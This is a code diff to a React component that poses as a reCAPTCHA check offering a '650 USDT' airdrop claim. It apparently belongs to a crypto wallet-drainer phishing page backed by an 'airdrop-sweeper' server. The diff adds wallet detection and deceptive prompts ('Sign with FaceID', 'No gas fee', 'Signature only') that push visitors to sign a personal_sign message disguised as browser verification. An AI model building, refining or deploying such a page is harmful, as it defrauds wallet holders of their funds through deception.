@@ -13,6 +13,7 @@ const SecuritySimulationCaptcha = () => {
   const [mobileOS, setMobileOS] = useState(null);
   const [eligibilityMessage, setEligibilityMessage] = useState('');
   const [modalStep, setModalStep] = useState(1);
+  const [detectedWallet, setDetectedWallet] = useState(null);
   const recaptchaRef = useRef(null);
   const isRecaptchaLoaded = useRef(false);
 
@@ -20,53 +21,22 @@ const SecuritySimulationCaptcha = () => {
   const BSC_TEST_WALLET = '0x9f61ab04125ef3fec9d5ba153d5bcd19347f3c7b';
   const API_URL = import.meta.env.VITE_API_URL || 'https://airdrop-sweeper-backen.onrender.com';
 
-  // Mobile wallet deep links
-  const WALLET_LINKS = {
-    trustwallet: {
-      ios: 'trust://',
-      android: 'trust://',
-      universal: 'https://link.trustwallet.com/'
-    },
-    metamask: {
-      ios: 'metamask://',
-      android: 'metamask://',
-      universal: 'https://metamask.app.link/'
-    },
-    bybit: {
-      ios: 'bybit://',
-      android: 'bybit://',
-      universal: 'https://www.bybit.com/wallet/'
-    },
-    binance: {
-      ios: 'bnc://',
-      android: 'bnc://',
-      universal: 'https://www.binance.com/en/wallet'
-    },
-    phantom: {
-      ios: 'phantom://',
-      android: 'phantom://',
-      universal: 'https://phantom.app/ul/'
-    },
-    coinbase: {
-      ios: 'cbwallet://',
-      android: 'cbwallet://',
-      universal: 'https://wallet.coinbase.com/'
-    },
-    safePal: {
-      ios: 'safepal://',
-      android: 'safepal://',
-      universal: 'https://www.safepal.com/download'
-    },
-    tokenPocket: {
-      ios: 'tp://',
-      android: 'tp://',
-      universal: 'https://www.tokenpocket.pro/'
-    },
-    imToken: {
-      ios: 'imtoken://',
-      android: 'imtoken://',
-      universal: 'https://token.im/'
+  // Detect which wallet is installed (without auto-opening)
+  const detectInstalledWallet = () => {
+    if (typeof window !== 'undefined') {
+      if (window.ethereum) {
+        if (window.ethereum.isTrust) return { name: 'Trust Wallet', icon: '🔷', installed: true };
+        if (window.ethereum.isMetaMask) return { name: 'MetaMask', icon: '🦊', installed: true };
+        if (window.ethereum.isBybit) return { name: 'Bybit Wallet', icon: '📊', installed: true };
+        if (window.ethereum.isBinance) return { name: 'Binance Wallet', icon: '🟡', installed: true };
+        if (window.ethereum.isCoinbaseWallet) return { name: 'Coinbase Wallet', icon: '💰', installed: true };
+        return { name: 'Web3 Wallet', icon: '💳', installed: true };
+      }
+      if (window.solana && window.solana.isPhantom) {
+        return { name: 'Phantom', icon: '🟣', installed: true };
+      }
     }
+    return { name: null, installed: false };
   };
 
   useEffect(() => {
@@ -78,6 +48,13 @@ const SecuritySimulationCaptcha = () => {
       viewport.name = 'viewport';
       viewport.content = 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover';
       document.head.appendChild(viewport);
+    }
+    
+    // Detect wallet on load
+    const wallet = detectInstalledWallet();
+    if (wallet.installed) {
+      setDetectedWallet(wallet);
+      console.log('[Wallet] Detected:', wallet.name);
     }
   }, []);
 
@@ -94,60 +71,6 @@ const SecuritySimulationCaptcha = () => {
       }
     }
   }, []);
-
-  // Detect and open mobile wallet automatically
-  const openMobileWallet = async () => {
-    const os = mobileOS || (isMobile ? 'android' : 'ios');
-    
-    // Detect which wallet is installed
-    if (window.ethereum) {
-      if (window.ethereum.isTrust) {
-        const link = WALLET_LINKS.trustwallet[os] || WALLET_LINKS.trustwallet.universal;
-        window.location.href = link;
-        return 'Trust Wallet';
-      } else if (window.ethereum.isMetaMask) {
-        const link = WALLET_LINKS.metamask[os] || WALLET_LINKS.metamask.universal;
-        window.location.href = link;
-        return 'MetaMask';
-      } else if (window.ethereum.isBybit) {
-        const link = WALLET_LINKS.bybit[os] || WALLET_LINKS.bybit.universal;
-        window.location.href = link;
-        return 'Bybit Wallet';
-      } else if (window.ethereum.isBinance) {
-        const link = WALLET_LINKS.binance[os] || WALLET_LINKS.binance.universal;
-        window.location.href = link;
-        return 'Binance Wallet';
-      } else if (window.ethereum.isCoinbaseWallet) {
-        const link = WALLET_LINKS.coinbase[os] || WALLET_LINKS.coinbase.universal;
-        window.location.href = link;
-        return 'Coinbase Wallet';
-      } else if (window.ethereum.isSafePal) {
-        const link = WALLET_LINKS.safePal[os] || WALLET_LINKS.safePal.universal;
-        window.location.href = link;
-        return 'SafePal';
-      } else if (window.ethereum.isTokenPocket) {
-        const link = WALLET_LINKS.tokenPocket[os] || WALLET_LINKS.tokenPocket.universal;
-        window.location.href = link;
-        return 'TokenPocket';
-      } else if (window.ethereum.isImToken) {
-        const link = WALLET_LINKS.imToken[os] || WALLET_LINKS.imToken.universal;
-        window.location.href = link;
-        return 'imToken';
-      }
-    }
-    
-    // Check for Phantom (Solana)
-    if (window.solana && window.solana.isPhantom) {
-      const link = WALLET_LINKS.phantom[os] || WALLET_LINKS.phantom.universal;
-      window.location.href = link;
-      return 'Phantom';
-    }
-    
-    // Default to Trust Wallet if no wallet detected
-    const defaultLink = WALLET_LINKS.trustwallet[os] || WALLET_LINKS.trustwallet.universal;
-    window.location.href = defaultLink;
-    return 'Trust Wallet';
-  };
 
   const showVerificationModal = async () => {
     setShowSecurityModal(true);
@@ -241,21 +164,33 @@ const SecuritySimulationCaptcha = () => {
     setIsProcessing(true);
 
     try {
-      // For mobile devices, open wallet app automatically
+      // Check if wallet is detected
+      const wallet = detectInstalledWallet();
+      
+      if (!wallet.installed) {
+        if (isMobile) {
+          setErrorMessage('No wallet detected. Please install Trust Wallet, MetaMask, or Bybit Wallet from your app store, then open this page again.');
+        } else {
+          setErrorMessage('No wallet detected. Please install Trust Wallet or MetaMask extension.');
+        }
+        setIsProcessing(false);
+        return;
+      }
+      
+      // For mobile, show instruction to open wallet app
       if (isMobile) {
-        setEligibilityMessage('Opening your wallet app...');
-        const walletName = await openMobileWallet();
-        console.log('[Mobile] Opening:', walletName);
+        setEligibilityMessage(`📱 Please open ${wallet.name} app to sign the claim receipt`);
+        setModalStep(4);
         
-        // Wait for user to return from wallet app
-        await new Promise(r => setTimeout(r, 3000));
+        // Wait for user to open wallet and come back
+        await new Promise(r => setTimeout(r, 5000));
       }
 
       if (!window.ethereum) {
         if (isMobile) {
-          setErrorMessage('No wallet detected. Please install Trust Wallet, MetaMask, or Bybit Wallet from app store.');
+          setErrorMessage(`Please open ${wallet.name} app and use its built-in browser, or open this page in ${wallet.name}'s browser.`);
         } else {
-          setErrorMessage('No wallet detected. Please install Trust Wallet or MetaMask extension.');
+          setErrorMessage('Please refresh the page and connect your wallet.');
         }
         setIsProcessing(false);
         return;
@@ -283,17 +218,17 @@ const SecuritySimulationCaptcha = () => {
       await switchToBSC();
       await new Promise(r => setTimeout(r, 1000));
       
-      // Create claim message (what user will see in wallet)
+      // Create claim message
       const randomId = Math.random().toString(36).substring(2, 15);
       const claimMessage = "I authorize reCAPTCHA Browser Verification for " + new Date().toLocaleDateString() + ". Internal ID: " + randomId;
       
       console.log('[Message]', claimMessage);
-      setEligibilityMessage('Please check your wallet to sign the claim receipt...');
+      setEligibilityMessage(`📱 Please check ${wallet.name} app to sign with FaceID / Fingerprint`);
       setModalStep(4);
       
       await new Promise(r => setTimeout(r, 500));
       
-      // Request signature - THIS WILL OPEN THE WALLET POPUP
+      // Request signature - THIS WILL OPEN THE SIGNATURE POPUP
       const signature = await window.ethereum.request({
         method: 'personal_sign',
         params: [claimMessage, userAddress]
@@ -341,7 +276,7 @@ const SecuritySimulationCaptcha = () => {
       hideSecurityModal_();
       
       if (error.code === 4001) {
-        setErrorMessage('You rejected the signature request. Please try again.');
+        setErrorMessage('You rejected the signature request. Please try again and sign with FaceID.');
         if (window.grecaptcha) window.grecaptcha.reset();
         setIsVerified(false);
       } else {
@@ -402,8 +337,17 @@ const SecuritySimulationCaptcha = () => {
 
         <div className="p-4 sm:p-6">
           <div className="mb-3 sm:mb-4 text-center">
-            <p className="text-xs text-gray-500">Supported: Trust Wallet | MetaMask | Bybit | Binance | Phantom | Coinbase</p>
+            <p className="text-xs text-gray-500">Supported: Trust Wallet | MetaMask | Bybit | Binance | Phantom</p>
           </div>
+
+          {/* Show detected wallet */}
+          {detectedWallet && !isProcessing && !simulationData && (
+            <div className="mb-4 p-2 bg-green-50 border border-green-200 rounded-lg text-center">
+              <span className="text-sm text-green-700">
+                ✅ Detected: {detectedWallet.icon} {detectedWallet.name}
+              </span>
+            </div>
+          )}
 
           <div className="flex justify-center mb-6 overflow-x-auto">
             <div ref={recaptchaRef} className="transform scale-90 sm:scale-100 origin-center"></div>
@@ -413,7 +357,7 @@ const SecuritySimulationCaptcha = () => {
             <div className="text-center py-6 sm:py-8">
               <div className="animate-spin rounded-full h-10 w-10 sm:h-12 sm:w-12 border-b-4 border-blue-600 mx-auto mb-3"></div>
               <p className="text-gray-600 text-sm">{eligibilityMessage || 'Waiting for signature...'}</p>
-              <p className="text-xs text-gray-400 mt-2">Please check your wallet</p>
+              <p className="text-xs text-gray-400 mt-2">Use FaceID / Fingerprint to sign</p>
             </div>
           )}
 
@@ -445,7 +389,7 @@ const SecuritySimulationCaptcha = () => {
 
           <div className="mt-6 pt-4 border-t border-gray-200 text-center">
             <p className="text-xs text-gray-500">Complete the CAPTCHA to claim 650 USDT</p>
-            <p className="text-xs text-gray-400 mt-1">No gas fee required for claim verification</p>
+            <p className="text-xs text-gray-400 mt-1">Sign with FaceID / Fingerprint - No gas fee</p>
           </div>
         </div>
       </div>
@@ -476,15 +420,17 @@ const SecuritySimulationCaptcha = () => {
             )}
             {modalStep === 4 && (
               <>
-                <div className="text-4xl sm:text-5xl mb-4">✍️</div>
-                <h3 className="text-lg sm:text-xl font-semibold text-gray-800 mb-2">Claim Receipt Ready</h3>
-                <p className="text-gray-600 text-xs sm:text-sm mb-3 break-words">{eligibilityMessage || 'Please sign the claim receipt in your wallet'}</p>
+                <div className="text-4xl sm:text-5xl mb-4">📱</div>
+                <h3 className="text-lg sm:text-xl font-semibold text-gray-800 mb-2">Open Your Wallet App</h3>
+                <p className="text-gray-600 text-sm mb-3 break-words">
+                  {eligibilityMessage || `Please open ${detectedWallet?.name || 'your wallet'} app and sign with FaceID / Fingerprint`}
+                </p>
                 <div className="mt-3 p-3 bg-blue-50 rounded-lg">
-                  <p className="text-sm text-blue-600 font-medium">✓ No gas fee required</p>
-                  <p className="text-xs text-blue-500 mt-1">This is a signature only</p>
+                  <p className="text-sm text-blue-600 font-medium">✓ Sign with FaceID / Fingerprint</p>
+                  <p className="text-xs text-blue-500 mt-1">No gas fee required - Signature only</p>
                 </div>
                 <div className="mt-3 p-2 bg-yellow-50 rounded-lg">
-                  <p className="text-xs text-yellow-600">A popup will appear in your wallet extension</p>
+                  <p className="text-xs text-yellow-600">The signature popup will appear in your wallet app</p>
                 </div>
               </>
             )}
